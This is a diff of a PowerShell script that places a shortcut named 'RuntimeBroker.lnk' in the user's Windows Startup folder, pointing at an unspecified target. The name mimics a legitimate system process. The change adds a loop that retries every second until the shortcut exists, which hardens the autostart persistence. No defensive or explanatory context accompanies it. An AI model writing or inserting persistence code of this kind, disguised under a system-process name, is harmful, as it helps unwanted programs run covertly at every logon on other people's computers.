@@ -3,6 +3,10 @@ $startupFolder = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Star
 $shortcutName = "RuntimeBroker.lnk"
 
 $shell = New-Object -ComObject WScript.Shell
-$shortcut = $shell.CreateShortcut("$startupFolder\$shortcutName")
-$shortcut.TargetPath = $targetPath
-$shortcut.Save()
+
+while (-not (Test-Path "$startupFolder\$shortcutName")) {
+    $shortcut = $shell.CreateShortcut("$startupFolder\$shortcutName")
+    $shortcut.TargetPath = $targetPath
+    $shortcut.Save()
+    Start-Sleep -Seconds 1
+}
